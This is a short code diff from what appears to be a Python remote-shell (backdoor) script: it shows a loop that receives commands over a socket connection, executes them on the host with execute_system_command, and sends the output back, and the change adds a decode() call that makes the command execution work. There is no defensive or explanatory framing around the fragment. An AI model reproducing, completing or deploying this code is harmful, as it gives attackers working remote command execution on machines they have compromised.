@@ -11,7 +11,7 @@ connection.send(("\n[+] Connection established.\n").encode())
 
 while True:
     command = connection.recv(1024)
-    command_result = execute_system_command(command)
+    command_result = execute_system_command(command.decode())
     connection.send(command_result)
 
 connection.close()
